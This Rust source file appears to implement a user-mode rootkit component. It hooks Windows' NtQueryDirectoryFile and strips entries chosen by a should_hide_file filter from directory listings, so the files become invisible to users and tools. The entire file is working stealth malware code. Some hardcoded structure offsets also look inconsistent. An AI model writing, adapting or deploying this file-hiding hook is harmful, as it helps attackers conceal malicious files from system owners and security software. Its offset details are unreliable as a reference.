use std::ffi::c_void;
use std::{mem, slice, ptr};

use windows::Win32::Foundation::{BOOL, HANDLE};

use crate::config::should_hide_file;

const FILE_DIRECTORY_INFORMATION: u32 = 1;
const FILE_FULL_DIR_INFORMATION: u32 = 2;
const FILE_BOTH_DIR_INFORMATION: u32 = 3;
const FILE_NAMES_INFORMATION: u32 = 12;
const FILE_ID_BOTH_DIR_INFORMATION: u32 = 37;
const FILE_ID_FULL_DIR_INFORMATION: u32 = 38;

const STATUS_NO_MORE_FILES: i32 = 0x80000006u32 as i32;

type NtQueryDirectoryFile = unsafe extern "system" fn(
    file_handle: HANDLE,
    event: HANDLE,
    apc_routine: *mut c_void,
    apc_context: *mut c_void,
    io_status_block: *mut c_void,
    file_information: *mut c_void,
    length: u32,
    file_information_class: u32,
    return_single_entry: BOOL,
    file_name: *mut c_void,
    restart_scan: BOOL,
) -> i32;

pub unsafe extern "system" fn hook_nt_query_directory_file(
    file_handle: HANDLE,
    event: HANDLE,
    apc_routine: *mut c_void,
    apc_context: *mut c_void,
    io_status_block: *mut c_void,
    file_information: *mut c_void,
    length: u32,
    file_information_class: u32,
    return_single_entry: BOOL,
    file_name: *mut c_void,
    restart_scan: BOOL
) -> i32 {
    let state_guard = crate::NT_QUERY_DIRECTORY_FILE
        .lock()
        .unwrap();

    let state = state_guard
        .as_ref()
        .unwrap();

    unsafe {
        state.unhook();

        let valid_class = matches!(
            file_information_class,
            FILE_DIRECTORY_INFORMATION | FILE_FULL_DIR_INFORMATION |
            FILE_BOTH_DIR_INFORMATION | FILE_NAMES_INFORMATION |
            FILE_ID_BOTH_DIR_INFORMATION | FILE_ID_FULL_DIR_INFORMATION
        );

        let original_func = mem::transmute::<usize, NtQueryDirectoryFile>(state.target);
        let mut status = original_func(
            file_handle,
            event,
            apc_routine,
            apc_context,
            io_status_block,
            file_information,
            length,
            file_information_class,
            return_single_entry,
            file_name,
            restart_scan
        );

        if status == 0 && valid_class && !file_information.is_null() {
            let file_info_ptr = file_information as *mut u8;

            if return_single_entry.as_bool() {
                loop {
                    if let Some((name_ptr, name_len)) = get_name_and_offset(file_info_ptr, file_information_class) {
                        let name = slice::from_raw_parts(name_ptr, name_len);
                        if !should_hide_file(name) {
                            break;
                        }
                    } else {
                        break;
                    }

                    status = original_func(
                        file_handle,
                        event,
                        apc_routine,
                        apc_context,
                        io_status_block,
                        file_information,
                        length,
                        file_information_class,
                        return_single_entry,
                        file_name, restart_scan
                    );

                    if status != 0 {
                        break;
                    }
                }
            } else {
                let mut current = file_info_ptr;
                let mut previous = std::ptr::null_mut::<u8>();

                loop {
                    let next_offset = *(current as *mut u32);

                    let should_hide = if let Some((name_ptr, name_len)) = get_name_and_offset(current, file_information_class) {
                        let name = slice::from_raw_parts(name_ptr, name_len);
                        should_hide_file(name)
                    } else {
                        false
                    };

                    if should_hide {
                        if next_offset != 0 {
                            // we take out this entry that should
                            // be hidden and move everything forward

                            let remaining = length as usize
                                - (current as usize - file_info_ptr as usize)
                                - next_offset as usize;

                            ptr::copy(
                                current.add(next_offset as usize),
                                current,
                                remaining
                            );

                            continue;
                        } else {
                            if current == file_info_ptr {
                                status = STATUS_NO_MORE_FILES;
                            } else if !previous.is_null() {
                                *(previous as *mut u32) = 0;
                            }

                            break;
                        }
                    }

                    if next_offset == 0 {
                        break;
                    }

                    previous = current;
                    current = current.add(next_offset as usize);
                }
            }
        }

        state.repatch(hook_nt_query_directory_file as usize);

        status
    }
}

fn get_name_and_offset(ptr: *mut u8, class: u32) -> Option<(*mut u16, usize)> {
    unsafe {
        match class {
            FILE_DIRECTORY_INFORMATION => {
                let name_len = *(ptr.add(56) as *mut u32) as usize / 2;
                Some((ptr.add(64) as *mut u16, name_len))
            }

            FILE_FULL_DIR_INFORMATION => {
                let name_len = *(ptr.add(56) as *mut u32) as usize / 2;
                Some((ptr.add(68) as *mut u16, name_len))
            }

            FILE_BOTH_DIR_INFORMATION | FILE_ID_BOTH_DIR_INFORMATION => {
                let name_len = *(ptr.add(56) as *mut u32) as usize / 2;
                Some((ptr.add(94) as *mut u16, name_len))
            }

            FILE_NAMES_INFORMATION => {
                let name_len = *(ptr.add(8) as *mut u32) as usize / 2;
                Some((ptr.add(12) as *mut u16, name_len))
            }

            FILE_ID_FULL_DIR_INFORMATION => {
                let name_len = *(ptr.add(56) as *mut u32) as usize / 2;
                Some((ptr.add(72) as *mut u16, name_len))
            }

            _ => None
        }
    }
}
